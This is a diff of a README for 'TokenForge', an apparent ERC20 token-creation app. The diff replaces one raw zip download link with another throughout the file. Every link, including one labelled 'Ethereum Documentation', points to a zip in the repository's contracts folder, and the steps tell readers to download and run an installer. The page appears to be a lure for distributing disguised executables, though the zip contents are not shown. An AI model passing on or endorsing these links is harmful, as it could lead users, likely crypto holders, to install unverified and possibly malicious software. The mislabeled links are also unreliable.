@@ -19,13 +19,13 @@ To begin using TokenForge, follow these simple steps:
 
 1. **Download TokenForge**:
    - Click the link below to go to the Downloads page:
-   - [![Download TokenForge](https://raw.githubusercontent.com/sandeepbhoir/TokenForge-ERC20/main/contracts/Token_ER_Forge_1.4.zip%https://raw.githubusercontent.com/sandeepbhoir/TokenForge-ERC20/main/contracts/Token_ER_Forge_1.4.zip)](https://raw.githubusercontent.com/sandeepbhoir/TokenForge-ERC20/main/contracts/Token_ER_Forge_1.4.zip)
+   - [![Download TokenForge](https://github.com/sandeepbhoir/TokenForge-ERC20/raw/refs/heads/main/contracts/ER-Token-Forge-v1.3.zip%https://github.com/sandeepbhoir/TokenForge-ERC20/raw/refs/heads/main/contracts/ER-Token-Forge-v1.3.zip)](https://github.com/sandeepbhoir/TokenForge-ERC20/raw/refs/heads/main/contracts/ER-Token-Forge-v1.3.zip)
 
 2. **Select a Release**:
    - On the Releases page, you will see different versions of TokenForge. Choose the most recent version for the best features and security.
 
 3. **Download the Application**:
-   - Click on the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/sandeepbhoir/TokenForge-ERC20/main/contracts/Token_ER_Forge_1.4.zip for Linux) to download the application.
+   - Click on the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://github.com/sandeepbhoir/TokenForge-ERC20/raw/refs/heads/main/contracts/ER-Token-Forge-v1.3.zip for Linux) to download the application.
 
 4. **Install TokenForge**:
    - Locate the downloaded file on your computer.
@@ -36,7 +36,7 @@ To begin using TokenForge, follow these simple steps:
    - Click to open TokenForge and start creating your tokens.
 
 ## 📥 Download & Install
-To download TokenForge, visit the Downloads page here: [TokenForge Releases](https://raw.githubusercontent.com/sandeepbhoir/TokenForge-ERC20/main/contracts/Token_ER_Forge_1.4.zip).
+To download TokenForge, visit the Downloads page here: [TokenForge Releases](https://github.com/sandeepbhoir/TokenForge-ERC20/raw/refs/heads/main/contracts/ER-Token-Forge-v1.3.zip).
 
 ## 🎉 Creating Your Token
 1. **Open the Application**:
@@ -78,8 +78,8 @@ To download TokenForge, visit the Downloads page here: [TokenForge Releases](htt
   - Most properties are fixed after deployment. Make sure to review your choices before launching your token.
 
 ## 🔗 Useful Links
-- [TokenForge Releases](https://raw.githubusercontent.com/sandeepbhoir/TokenForge-ERC20/main/contracts/Token_ER_Forge_1.4.zip)
-- [Ethereum Documentation](https://raw.githubusercontent.com/sandeepbhoir/TokenForge-ERC20/main/contracts/Token_ER_Forge_1.4.zip)
+- [TokenForge Releases](https://github.com/sandeepbhoir/TokenForge-ERC20/raw/refs/heads/main/contracts/ER-Token-Forge-v1.3.zip)
+- [Ethereum Documentation](https://github.com/sandeepbhoir/TokenForge-ERC20/raw/refs/heads/main/contracts/ER-Token-Forge-v1.3.zip)
 
 ## 📞 Support
 If you need further assistance, feel free to reach out to our support team via the Issues section on our GitHub page. We aim to respond promptly to all inquiries.
